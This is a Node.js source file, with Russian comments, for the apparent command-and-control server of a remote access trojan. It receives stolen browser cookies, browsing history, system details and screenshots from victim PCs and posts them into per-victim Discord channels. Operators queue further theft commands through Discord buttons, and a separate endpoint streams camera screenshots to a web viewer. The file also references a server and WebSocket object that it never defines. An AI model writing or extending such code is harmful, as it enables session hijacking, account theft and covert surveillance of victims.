import express from "express";
import { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } from "discord.js";
import { WebSocketServer } from "ws";
import http from "http";
import crypto from "crypto";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.json({ limit: "100mb" }));
app.use(express.static(path.join(__dirname, "public"))); // cams.html

// ---------- Конфиг ----------
const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;

const CATEGORY_BASE_PC = "Все ПК";
const CATEGORY_BASE_CAM = "Камеры";
const LOG_CATEGORY = "Логи";
const LOG_CHANNEL = "server-logs";
const MAX_FILE_SIZE = 6*1024*1024;

// ---------- Состояние ----------
const onlinePCs = {};
const pendingCommands = {};
const pcData = {};
const channelByPC = {};
const channelByCam = {};
const wsCameraClients = {};
const camLastUpload = {};
let logCategoryCache = null;
let logChannelCache = null;
let categoryCacheByGuild = new Map();
let channelCacheByGuild = new Map();

// ---------- Discord Bot ----------
const bot = new Client({ intents: [GatewayIntentBits.Guilds] });
bot.once("ready", ()=>console.log(`✅ Бот вошёл как ${bot.user.tag}`));
bot.login(DISCORD_BOT_TOKEN);

// ---------- Утилиты ----------
function shortHash(s,len=8){ return crypto.createHash('sha1').update(s).digest('hex').slice(0,len); }
function safeChannelName(prefix,id){ return `${prefix}-${shortHash(id,8)}`.toLowerCase().replace(/[^a-z0-9\-]/g,'-').slice(0,90); }

async function logToDiscord(msg){
    try {
        const guild = await bot.guilds.fetch(GUILD_ID);
        const channel = await getOrCreateLogChannel(guild);
        await channel.send(`[${new Date().toISOString()}] ${msg}`);
    } catch(e){ console.error("Ошибка логирования:",e); }
}

async function getOrCreateCategory(guild,name){
    const gid = guild.id;
    if(!categoryCacheByGuild.has(gid)) categoryCacheByGuild.set(gid,{});
    const cache = categoryCacheByGuild.get(gid);
    if(cache[name]) return cache[name];
    const channels = await guild.channels.fetch();
    const matches = channels.filter(c=>c.type===ChannelType.GuildCategory && c.name===name);
    if(matches.size>=1){ cache[name]=matches.first(); return matches.first(); }
    const created = await guild.channels.create({name,type:ChannelType.GuildCategory});
    cache[name] = created;
    return created;
}

async function getOrCreateTextChannel(guild,name,parentId){
    const gid = guild.id;
    if(!channelCacheByGuild.has(gid)) channelCacheByGuild.set(gid,{});
    const cache = channelCacheByGuild.get(gid);
    const key = `${name}::${parentId}`;
    if(cache[key]) return cache[key];
    const channels = await guild.channels.fetch();
    const matches = channels.filter(c=>c.type===ChannelType.GuildText && c.name===name && c.parentId===parentId);
    if(matches.size>=1){ cache[key]=matches.first(); return matches.first(); }
    const created = await guild.channels.create({name,type:ChannelType.GuildText,parent:parentId});
    cache[key]=created;
    await logToDiscord(`Создан канал ${name}`);
    return created;
}

async function getOrCreateLogChannel(guild){
    if(logChannelCache) return logChannelCache;
    const category = logCategoryCache || await getOrCreateCategory(guild,LOG_CATEGORY);
    logCategoryCache = category;
    const channels = await guild.channels.fetch();
    const matches = channels.filter(c=>c.type===ChannelType.GuildText && c.name===LOG_CHANNEL && c.parentId===category.id);
    if(matches.size>0){ logChannelCache=matches.first(); return matches.first(); }
    const created = await guild.channels.create({name:LOG_CHANNEL,type:ChannelType.GuildText,parent:category.id});
    logChannelCache=created;
    return created;
}

// ---------- Кнопки управления ----------
function createControlButtons(pcId){
    const safePcId = encodeURIComponent(pcId);
    return [new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`check_online|${safePcId}`).setLabel("Чек онлайн").setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`get_cookies|${safePcId}`).setLabel("Куки").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`get_history|${safePcId}`).setLabel("История").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`get_system|${safePcId}`).setLabel("Системная").setStyle(ButtonStyle.Secondary),
        new ButtonBuilder().setCustomId(`get_screenshot|${safePcId}`).setLabel("Скриншот").setStyle(ButtonStyle.Secondary)
    )];
}

// ---------- Обработка кнопок ----------
bot.on("interactionCreate", async interaction => {
    if(!interaction.isButton()) return;
    const [command, encodedPcId] = interaction.customId.split("|");
    const pcId = decodeURIComponent(encodedPcId);
    if(!pendingCommands[pcId]) pendingCommands[pcId]=[];
    pendingCommands[pcId].push(command);
    await interaction.reply({content:`✅ Команда "${command}" отправлена ПК ${pcId}`,ephemeral:true});
});

// ---------- Upload PC ----------
app.post("/upload-pc", async (req,res)=>{
    try{
        const { pcId, cookies, history, systemInfo, screenshot } = req.body;
        if(!pcId) return res.status(400).json({error:"pcId required"});
        onlinePCs[pcId] = Date.now();
        pcData[pcId] = { cookies, history, systemInfo, screenshot };
        const guild = await bot.guilds.fetch(GUILD_ID);
        const category = await getOrCreateCategory(guild,CATEGORY_BASE_PC);
        const channelName = safeChannelName('pc',pcId);
        const channel = channelByPC[pcId] ? await guild.channels.fetch(channelByPC[pcId]).catch(()=>null) : null;
        const finalChannel = channel || await getOrCreateTextChannel(guild,channelName,category.id);
        channelByPC[pcId] = finalChannel.id;
        const files=[];
        if(cookies) files.push({attachment:Buffer.from(JSON.stringify({cookies},null,2)) ,name:`${channelName}-cookies.json`});
        if(history) files.push({attachment:Buffer.from(JSON.stringify({history},null,2)) ,name:`${channelName}-history.json`});
        if(systemInfo) files.push({attachment:Buffer.from(JSON.stringify({systemInfo},null,2)) ,name:`${channelName}-system.json`});
        if(screenshot) files.push({attachment:Buffer.from(screenshot,"base64") ,name:`${channelName}-screenshot.jpeg`});
        const messageOptions = { components: createControlButtons(pcId) };
        if(files.length) messageOptions.files = files; else messageOptions.content=`🟢 ПК ${pcId} обновлён`;
        await finalChannel.send(messageOptions);
        res.json({success:true});
    }catch(e){ await logToDiscord(`❌ Ошибка upload-pc: ${e.message}`); res.status(500).json({error:e.message}); }
});

// ---------- Ping ----------
app.post("/ping",(req,res)=>{
    const { pcId } = req.body;
    if(!pcId) return res.status(400).json({error:"pcId required"});
    onlinePCs[pcId] = Date.now();
    const commands = pendingCommands[pcId] || [];
    pendingCommands[pcId] = [];
    res.json({commands});
});

// ---------- Upload Cam ----------
app.post("/upload-cam", async (req,res)=>{
    try{
        const { camId, screenshot } = req.body;
        if(!camId || !screenshot) return res.status(400).json({error:"camId and screenshot required"});
        if(wsCameraClients[camId]){
            const data = JSON.stringify({camId,screenshot});
            wsCameraClients[camId].forEach(ws=>{ try{ ws.send(data); }catch(e){} });
        }
        const now = Date.now();
        camLastUpload[camId] = now;
        res.json({success:true});
    }catch(e){ await logToDiscord(`❌ Ошибка upload-cam: ${e.message}`); res.status(500).json({error:e.message}); }
});

// ---------- WebSocket ----------
server.on("upgrade",(req,socket,head)=>{
    wss.handleUpgrade(req,socket,head,ws=>wss.emit("connection",ws,req));
});

// ---------- Запуск ----------
const PORT = process.env.PORT || 3000;
server.listen(PORT,()=>console.log(`🚀 Сервер слушает порт ${PORT}`));

process.on("uncaughtException", e => logToDiscord(`💥 Uncaught Exception: ${e.message}`));
process.on("unhandledRejection", e => logToDiscord(`💥 Unhandled Rejection: ${e}`));